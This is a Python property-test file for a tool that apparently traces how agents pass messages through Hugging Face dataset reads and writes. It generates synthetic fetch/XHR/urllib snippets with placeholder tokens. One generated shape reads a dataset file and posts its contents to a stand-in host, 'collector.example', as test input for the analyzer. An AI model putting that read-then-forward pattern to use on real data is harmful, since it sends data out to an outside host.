"""Property tests for the counting rule (docs/counting-rule.md, properties P1 to P7).

Seeded random swarms, standard library only (random.Random with fixed seeds). Two generators:
  - gen_ops: bare operations for messages.deliveries (place, op, actor, time), a few hundred cases;
  - gen_swarm: records in the code shapes of the code-traces pack, run through the whole pipeline
    (analysis, reconstruct, message_flow) with the real pack.

Run from the project root:
    python3 -m unittest agenttrace.tests.test_properties -v
"""
import datetime as dt
import os
import random
import subprocess
import sys
import types
import unittest

from agenttrace import analysis, fx_whatif, messages, packs, reconstruct, units
from agenttrace.model import Event

PACK_PATH = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "packs", "code_traces.json")
BASE = 1783600000
HUB = "https://huggingface.co"
OPS_CASES = 300
SWARM_CASES = 120

# ------------------------------------------------------------------ shapes (each a record text)

WRITES = [
    lambda p, tok, n: f"await fetch('{HUB}/api/datasets/{p}/commit/main', {{method: 'POST', headers: {{'Authorization': 'Bearer {tok}'}}, body: B{n}}});",
    lambda p, tok, n: f"u='{HUB}/api/datasets/{p}/commit/main';h={{'Authorization':'Bearer {tok}'}};r=await fetch(u,{{method:'POST',headers:h,body:b{n}}})",
    lambda p, tok, n: f"x=new XMLHttpRequest;x.open('POST','{HUB}/api/datasets/{p}/commit/main',false);x.setRequestHeader('Authorization','Bearer {tok}');x.send(d{n})",
    lambda p, tok, n: f"import urllib.request as U\nr=U.urlopen(U.Request('{HUB}/api/datasets/{p}/commit/main',data=d{n},headers={{'Authorization':'Bearer {tok}'}}))",
]
READS = [
    lambda p, tok, n: f"const m = await fetch('{HUB}/datasets/{p}/resolve/main/m{n}.json', {{headers: {{'Authorization': 'Bearer {tok}'}}}});",
    lambda p, tok, n: f"u='{HUB}/datasets/{p}/resolve/main/f{n}';r=await fetch(u,{{headers:{{'Authorization':'Bearer {tok}'}}}})",
    lambda p, tok, n: f"x=new XMLHttpRequest;x.open('GET','{HUB}/datasets/{p}/resolve/main/f{n}',false);x.setRequestHeader('Authorization','Bearer {tok}');x.send()",
    lambda p, tok, n: f"import urllib.request as U\nr=U.urlopen(U.Request('{HUB}/datasets/{p}/resolve/main/f{n}',headers={{'Authorization':'Bearer {tok}'}}))",
    # reads the place, then posts what it read somewhere else: still a read of the place (R4, R8)
    lambda p, tok, n: f"r=await fetch('{HUB}/datasets/{p}/resolve/main/a{n}', {{headers:{{'Authorization':'Bearer {tok}'}}}});await fetch('https://collector.example/c{n}',{{method:'POST',body:await r.text()}})",
]
MENTIONS = [
    lambda p, tok, n: f"H='Bearer {tok}';\n// the crew says {HUB}/datasets/{p} has the plan {n}; not fetching it yet",     # R3
    lambda p, tok, n: f"H='Bearer {tok}';x{n}=await fetch('{HUB}/datasets/{p}',{{metho",                                  # R13
    lambda p, tok, n: f"H='Bearer {tok}';u='{HUB}/datasets/{p}';console.log({n})",                                        # R9
    lambda p, tok, n: f"H='Bearer {tok}';x=fetch('{HUB}/datasets/{p}/info/lfs/objects/batch',{{method:'POST',body:B{n}}})",  # R6
]


def _event(rid, text, t):
    return Event(id=rid, text=text, kind="payload", time=dt.datetime.fromtimestamp(t, dt.timezone.utc))


def gen_swarm(rng, n_records=None):
    """[(role, place, token, Event)] with distinct times at least 20 s apart; every record has its own token."""
    tokens = [f"[CREDENTIAL {100 + i}]" for i in range(rng.randint(2, 7))]
    places = [f"own{rng.randint(1, 3)}/r{i}" for i in range(rng.randint(1, 4))]
    n = n_records or rng.randint(12, 40)
    slots = rng.sample(range(n * 3), n)
    out = []
    for i in range(n):
        role = rng.choices(["write", "read", "mention"], weights=[3, 5, 1])[0]
        shape = rng.choice({"write": WRITES, "read": READS, "mention": MENTIONS}[role])
        p, tok = rng.choice(places), rng.choice(tokens)
        out.append((role, p, tok, _event(f"S{i:04d}", shape(p, tok, i), BASE + slots[i] * 20)))
    return out


_PACK = None


def pack():
    global _PACK
    if _PACK is None:
        _PACK = packs.load_pack(PACK_PATH)
    return _PACK


def flow_of(events):
    res = analysis.analyze(events, pack())
    rec = reconstruct.reconstruct(events, pack(), res)
    return messages.message_flow(events, pack(), rec, res), rec, res


def links(flow):
    return sorted((d["channel"], d["write_id"], d["read_id"], d["from"], d["to"], d["grade"]) for d in flow["_deliveries"])


def gen_ops(rng, ties=False):
    """Operations as messages.deliveries takes them: (place, op, actor, kind, time, index, record id)."""
    n = rng.randint(4, 40)
    places = [f"p:{i}" for i in range(rng.randint(1, 4))]
    actors = [f"[T {i}]" for i in range(rng.randint(2, 6))] + ["run:R1"]
    times = [rng.randint(0, 12) * 60 for _ in range(n)] if ties else rng.sample(range(0, n * 100, 7), n)
    ops = []
    for i in range(n):
        t = None if rng.random() < 0.06 else BASE + times[i]
        op = rng.choices(["write", "read", "post"], weights=[3, 5, 1])[0]
        ops.append((rng.choice(places), op, rng.choice(actors), "token", t, i, f"E{i:04d}"))
    return ops


# ------------------------------------------------------------------ operations level

class DeliveriesProperties(unittest.TestCase):
    """messages.deliveries on bare operations."""

    def each(self, ties=False, seed=11):
        rng = random.Random(seed)
        for case in range(OPS_CASES):
            yield case, rng, gen_ops(rng, ties)

    def test_P2_every_delivery_has_a_write_not_later_than_its_read_on_the_same_place(self):
        """R22, R23, R24, R25: same place, different actors, different records, write time <= read time, both dated."""
        for ties in (False, True):
            for case, _rng, ops in self.each(ties):
                by_id = {o[6]: o for o in ops}
                for d in messages.deliveries(ops)[0]:
                    w, r = by_id[d["write_id"]], by_id[d["read_id"]]
                    msg = f"case {case} ties={ties}: {d}"
                    self.assertEqual((w[0], r[0]), (d["channel"], d["channel"]), msg)
                    self.assertIn(w[1], ("write", "post"), msg)
                    self.assertIn(r[1], ("read", "post"), msg)
                    self.assertNotEqual(w[2], r[2], msg)
                    self.assertNotEqual(w[6], r[6], msg)
                    self.assertIsNotNone(w[4], msg)
                    self.assertIsNotNone(r[4], msg)
                    self.assertLessEqual(w[4], r[4], msg)
                    self.assertEqual((d["from"], d["to"]), (w[2], r[2]), msg)

    def test_R26_the_write_is_the_latest_earlier_one(self):
        """No other candidate write lies strictly between the linked write and the read."""
        for case, _rng, ops in self.each():
            for d in messages.deliveries(ops)[0]:
                between = [o for o in ops if o[0] == d["channel"] and o[1] in ("write", "post") and o[4] is not None
                           and o[2] != d["to"] and o[6] != d["read_id"] and d["write_time"] < o[4] <= d["read_time"]]
                self.assertEqual(between, [], f"case {case}: {d}")

    def test_R28_one_delivery_per_write_and_reader(self):
        for ties in (False, True):
            for case, _rng, ops in self.each(ties):
                seen = [(d["write_id"], d["to"]) for d in messages.deliveries(ops)[0]]
                self.assertEqual(len(seen), len(set(seen)), f"case {case}")

    def test_P3_order_of_operations_does_not_matter_when_times_differ(self):
        for case, rng, ops in self.each():
            want = sorted((d["channel"], d["write_id"], d["read_id"]) for d in messages.deliveries(ops)[0])
            mixed = ops[:]
            rng.shuffle(mixed)
            got = sorted((d["channel"], d["write_id"], d["read_id"]) for d in messages.deliveries(mixed)[0])
            self.assertEqual(got, want, f"case {case}")

    def test_R26_equal_times_fall_back_on_input_order(self):
        """The documented limit of P3: with two writes at the same time, the later in the input is taken."""
        w1 = ("p:A", "write", "[T 1]", "token", BASE, 0, "W1")
        w2 = ("p:A", "write", "[T 2]", "token", BASE, 1, "W2")
        r = ("p:A", "read", "[T 3]", "token", BASE + 60, 2, "R")
        self.assertEqual(messages.deliveries([w1, w2, r])[0][0]["write_id"], "W2")
        self.assertEqual(messages.deliveries([w2, w1, r])[0][0]["write_id"], "W1")
        self.assertEqual(len(messages.deliveries([w2, w1, r])[0]), 1)

    def test_P4_repeating_a_poll_adds_no_delivery(self):
        """R28: a second read by the same actor right after the first is a repeat read, not a message."""
        for case, _rng, ops in self.each():
            base = messages.deliveries(ops)
            more = list(ops)
            for o in ops:
                if o[1] == "read" and o[4] is not None:
                    more.append((o[0], "read", o[2], o[3], o[4] + 0.5, len(more), o[6] + "+again"))
            again = messages.deliveries(more)
            self.assertEqual(len(again[0]), len(base[0]), f"case {case}")
            self.assertEqual(sorted((d["write_id"], d["read_id"]) for d in again[0]),
                             sorted((d["write_id"], d["read_id"]) for d in base[0]), f"case {case}")
            self.assertGreaterEqual(again[5], base[5], f"case {case}")          # the repeats are counted as repeats

    def test_P6_no_writes_no_deliveries(self):
        """R24: without a write (or post) there is nothing to deliver."""
        for case, _rng, ops in self.each(True):
            reads_only = [(o[0], "read", *o[2:]) for o in ops if o[1] != "write"]
            self.assertEqual(messages.deliveries(reads_only)[0], [], f"case {case}")
            self.assertEqual(messages.deliveries([o for o in ops if o[1] == "read"])[0], [], f"case {case}")

    def test_R25_an_undated_read_is_never_a_delivery(self):
        for case, _rng, ops in self.each(True):
            undated = {o[6] for o in ops if o[4] is None}
            for d in messages.deliveries(ops)[0]:
                self.assertNotIn(d["read_id"], undated, f"case {case}")
                self.assertNotIn(d["write_id"], undated, f"case {case}")

    def test_R25_order_unknown_counts_undated_reads_with_another_writer(self):
        w = ("p:A", "write", "[T 1]", "token", BASE, 0, "W")
        r = ("p:A", "read", "[T 2]", "token", None, 1, "R")
        own = ("p:A", "read", "[T 1]", "token", None, 2, "R2")
        dels, _perf, unknown = messages.deliveries([w, r, own])[:3]
        self.assertEqual((dels, unknown), ([], 1))

    def test_R27_same_program_is_not_a_candidate(self):
        w_same = ("p:A", "write", "[T 1]", "token", BASE + 10, 0, "W1")
        w_other = ("p:A", "write", "[T 3]", "token", BASE, 1, "W0")
        r = ("p:A", "read", "[T 2]", "token", BASE + 60, 2, "R")
        fam = {"W1": "prog", "R": "prog", "W0": "other"}
        out = messages.deliveries([w_same, w_other, r], fam)
        self.assertEqual([(d["write_id"], d["read_id"]) for d in out[0]], [("W0", "R")])   # falls back to the older write
        out = messages.deliveries([w_same, r], fam)
        self.assertEqual((out[0], out[3]), ([], 1))                                        # counted as dropped

    def test_P7_same_result_twice(self):
        for case, _rng, ops in self.each(True):
            a, b = messages.deliveries(ops), messages.deliveries(list(ops))
            self.assertEqual(a[0], b[0], f"case {case}")
            self.assertEqual(a[2:4] + a[5:], b[2:4] + b[5:], f"case {case}")

    def test_R34_grade_does_not_change_the_count(self):
        for case, rng, ops in self.each():
            how = {(o[6], o[0]): rng.choice(["call", "inferred", "default"]) for o in ops}
            plain = messages.deliveries(ops)[0]
            graded = messages.deliveries(ops, None, None, how, lambda ch: ch.endswith("0"), lambda rid: rid.endswith("3"))[0]
            self.assertEqual([(d["write_id"], d["read_id"]) for d in graded], [(d["write_id"], d["read_id"]) for d in plain], f"case {case}")
            self.assertTrue(all(d["grade"] in messages.GRADES for d in graded))

    def test_R31_a_default_side_or_a_coarse_place_is_weak(self):
        for case, rng, ops in self.each():
            how = {(o[6], o[0]): rng.choice(["call", "inferred", "default"]) for o in ops}
            for d in messages.deliveries(ops, None, None, how, lambda ch: ch.endswith("0"))[0]:
                sides = (how[(d["write_id"], d["channel"])], how[(d["read_id"], d["channel"])])
                if "default" in sides or d["channel"].endswith("0"):
                    self.assertEqual(d["grade"], "weak", f"case {case}")
                else:
                    self.assertNotEqual(d["grade"], "weak", f"case {case}")


# ------------------------------------------------------------------ whole pipeline

class PipelineProperties(unittest.TestCase):
    """The same properties through analysis, reconstruct and message_flow with the code-traces pack."""

    def each(self, seed=23, cases=SWARM_CASES):
        rng = random.Random(seed)
        for case in range(cases):
            yield case, rng, gen_swarm(rng)

    def test_generator_produces_deliveries(self):
        """Guard: if the shapes stopped being recognised, every property below would pass on nothing."""
        total = writes = reads = 0
        for _case, _rng, sw in self.each(cases=30):
            flow, rec, res = flow_of([e for *_x, e in sw])
            ops = {(o[6], o[1]) for o in messages.channel_ops([e for *_x, e in sw], pack(), rec, res)}
            for role, _p, _tok, e in sw:
                self.assertEqual({op for rid, op in ops if rid == e.id}, {role} if role != "mention" else set(), e.text)
            total += flow["deliveries"]
            writes += sum(1 for r in sw if r[0] == "write")
            reads += sum(1 for r in sw if r[0] == "read")
        self.assertGreater(total, 100)
        self.assertGreater(writes, 100)
        self.assertGreater(reads, 100)

    def test_P2_writer_before_reader_on_the_same_place(self):
        for case, _rng, sw in self.each():
            role = {e.id: (r, p, tok, e.time.timestamp()) for r, p, tok, e in sw}
            for d in flow_of([e for *_x, e in sw])[0]["_deliveries"]:
                w, r = role[d["write_id"]], role[d["read_id"]]
                self.assertEqual((w[0], r[0]), ("write", "read"), f"case {case}: {d}")
                self.assertEqual("hf_dataset:" + w[1], d["channel"])
                self.assertEqual("hf_dataset:" + r[1], d["channel"])
                self.assertEqual((d["from"], d["to"]), (w[2], r[2]))
                self.assertNotEqual(w[2], r[2])
                self.assertLess(w[3], r[3])

    def test_P3_shuffling_the_records_changes_nothing(self):
        for case, rng, sw in self.each():
            events = [e for *_x, e in sw]
            want = links(flow_of(events)[0])
            mixed = events[:]
            rng.shuffle(mixed)
            self.assertEqual(links(flow_of(mixed)[0]), want, f"case {case}")

    def test_P4_duplicating_every_poll_adds_no_delivery(self):
        for case, _rng, sw in self.each():
            events = [e for *_x, e in sw]
            base = flow_of(events)[0]
            more = list(events)
            for role, _p, _tok, e in sw:
                if role == "read":
                    more.append(_event(e.id + "b", e.text, e.time.timestamp() + 1))
                    more.append(_event(e.id + "c", e.text, e.time.timestamp() + 2))
            again = flow_of(more)[0]
            self.assertEqual(links(again), links(base), f"case {case}")
            self.assertEqual(again["deliveries"], base["deliveries"], f"case {case}")

    def test_P5_records_that_only_mention_a_place_change_nothing(self):
        """R3 (comment), R13 (cut-off call), R9 (assigned, never passed), R6 (LFS batch, operation hidden)."""
        for case, rng, sw in self.each():
            kept = [(r, p, tok, e) for r, p, tok, e in sw if r != "mention"]
            base = links(flow_of([e for *_x, e in kept])[0])
            self.assertEqual(links(flow_of([e for *_x, e in sw])[0]), base, f"case {case}: the generated mentions")
            extra = [e for *_x, e in kept]
            places = sorted({p for _r, p, _tok, _e in kept})
            tokens = sorted({tok for _r, _p, tok, _e in kept})
            for k in range(12):
                shape = MENTIONS[k % len(MENTIONS)]
                extra.append(_event(f"M{k:03d}", shape(rng.choice(places), rng.choice(tokens), 900 + k),
                                    BASE + rng.randint(0, 150) * 20 + 7))
            self.assertEqual(links(flow_of(extra)[0]), base, f"case {case}: twelve more mentions")

    def test_P6_removing_every_write_leaves_no_delivery(self):
        for case, _rng, sw in self.each():
            events = [e for r, _p, _tok, e in sw if r != "write"]
            if events:
                self.assertEqual(flow_of(events)[0]["deliveries"], 0, f"case {case}")

    def test_P7_same_result_on_every_run(self):
        for case, _rng, sw in self.each(cases=40):
            events = [e for *_x, e in sw]
            self.assertEqual(links(flow_of(events)[0]), links(flow_of(list(events))[0]), f"case {case}")

    def test_P7_same_result_under_another_hash_seed(self):
        """Set and dict order must not leak into the count: two interpreters with different string hashing agree."""
        code = ("import random, hashlib, json\n"
                "from agenttrace.tests import test_properties as T\n"
                "rng = random.Random(5)\n"
                "out = [T.links(T.flow_of([e for *_x, e in T.gen_swarm(rng)])[0]) for _ in range(12)]\n"
                "print(hashlib.sha1(json.dumps(out).encode()).hexdigest(), sum(len(x) for x in out))\n")
        root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        outs = []
        for seed in ("0", "4242"):
            env = dict(os.environ, PYTHONHASHSEED=seed, PYTHONPATH=root)
            outs.append(subprocess.run([sys.executable, "-c", code], cwd=root, env=env, capture_output=True, text=True, timeout=120).stdout.strip())
        self.assertTrue(outs[0])
        self.assertEqual(outs[0], outs[1])
        self.assertGreater(int(outs[0].split()[1]), 20)


# ------------------------------------------------------------------ regrouping tokens into agents

def _session(flow):
    """The few attributes fx_whatif.recount and units._pairs read from a session."""
    return types.SimpleNamespace(flow=flow, pack=pack(), harm_sorted=[])


def random_partition(rng, names):
    """actor -> the agent it is counted as (a random grouping; every group is named after one of its members)."""
    names = sorted(names)
    rng.shuffle(names)
    amap, groups = {}, []
    for a in names:
        if groups and rng.random() < 0.5:
            g = rng.choice(groups)
        else:
            g = []
            groups.append(g)
        g.append(a)
    for g in groups:
        for a in g:
            amap[a] = g[0]
    return amap


class RegroupingProperties(unittest.TestCase):
    """P1 (R35, R36): counting by agent can only remove messages between units, never add them."""

    def test_P1_regrouping_never_raises_the_count_between_units(self):
        rng = random.Random(31)
        checked = 0
        for case in range(SWARM_CASES):
            sw = gen_swarm(rng)
            flow = flow_of([e for *_x, e in sw])[0]
            s = _session(flow)
            named = [d for d in flow["_deliveries"] if not d["from"].startswith("run:") and not d["to"].startswith("run:")]
            by_token = fx_whatif.recount(s, {}, set())
            self.assertEqual(by_token["messages"], len(named), f"case {case}")
            self.assertEqual(by_token["inside_one_agent"], 0, f"case {case}")
            for _ in range(4):
                amap = random_partition(rng, {x for d in named for x in (d["from"], d["to"])})
                by_agent = fx_whatif.recount(s, amap, set())
                msg = f"case {case} amap {amap}"
                self.assertLessEqual(by_agent["messages"], by_token["messages"], msg)
                self.assertLessEqual(by_agent["pairs"], by_token["pairs"], msg)
                self.assertEqual(by_agent["messages"] + by_agent["inside_one_agent"], by_token["messages"], msg)
                inside = sum(1 for d in named if amap.get(d["from"], d["from"]) == amap.get(d["to"], d["to"]))
                self.assertEqual(by_agent["inside_one_agent"], inside, msg)
                for _t, d, a, b in by_agent["_exact"]:
                    self.assertNotEqual(a, b, msg)                       # never between an agent and itself
                # the pair table of the Units view says the same
                plist, ilist, sent, recv, within = units._pairs(s, amap, set())
                self.assertTrue(all(p["from"] != p["to"] for p in plist), msg)
                self.assertEqual(sum(p["messages"] for p in plist), by_agent["messages"], msg)
                self.assertEqual(sum(x["messages"] for x in ilist), by_agent["inside_one_agent"], msg)
                checked += 1
        self.assertGreater(checked, 300)

    def test_P1_one_agent_for_everything_leaves_no_message_between_agents(self):
        rng = random.Random(37)
        for case in range(30):
            flow = flow_of([e for *_x, e in gen_swarm(rng)])[0]
            names = {x for d in flow["_deliveries"] for x in (d["from"], d["to"])}
            amap = {a: "[ONE]" for a in names}
            out = fx_whatif.recount(_session(flow), amap, set())
            self.assertEqual((out["messages"], out["pairs"], out["first_message"]), (0, 0, None), f"case {case}")

    def test_P1_a_rejected_message_is_not_counted_on_either_side(self):
        rng = random.Random(41)
        for case in range(30):
            flow = flow_of([e for *_x, e in gen_swarm(rng)])[0]
            dels = flow["_deliveries"]
            if not dels:
                continue
            rejected = {dels[0]["write_id"] + ">" + dels[0]["read_id"]}
            out = fx_whatif.recount(_session(flow), {}, rejected)
            self.assertEqual(out["messages"] + out["rejected"], len(dels), f"case {case}")
            self.assertEqual(out["rejected"], 1)


try:                                                    # optional: more cases when hypothesis happens to be installed
    import hypothesis                                   # noqa: F401
    from hypothesis import given, settings, strategies as st
    HAVE_HYPOTHESIS = True
except Exception:                                       # pragma: no cover
    HAVE_HYPOTHESIS = False


@unittest.skipUnless(HAVE_HYPOTHESIS, "hypothesis is not installed (optional)")
class HypothesisProperties(unittest.TestCase):
    def test_P2_and_P6_on_drawn_operations(self):
        op = st.tuples(st.sampled_from(["p:0", "p:1"]), st.sampled_from(["write", "read", "post"]),
                       st.sampled_from(["[T 1]", "[T 2]", "[T 3]"]), st.just("token"),
                       st.one_of(st.none(), st.integers(0, 50)))

        @settings(max_examples=200, deadline=None)
        @given(st.lists(op, max_size=25))
        def check(raw):
            ops = [(p, o, a, k, t, i, f"E{i}") for i, (p, o, a, k, t) in enumerate(raw)]
            by_id = {o[6]: o for o in ops}
            for d in messages.deliveries(ops)[0]:
                w, r = by_id[d["write_id"]], by_id[d["read_id"]]
                assert w[0] == r[0] and w[2] != r[2] and w[4] <= r[4]
            assert messages.deliveries([o for o in ops if o[1] == "read"])[0] == []
        check()


if __name__ == "__main__":
    unittest.main()
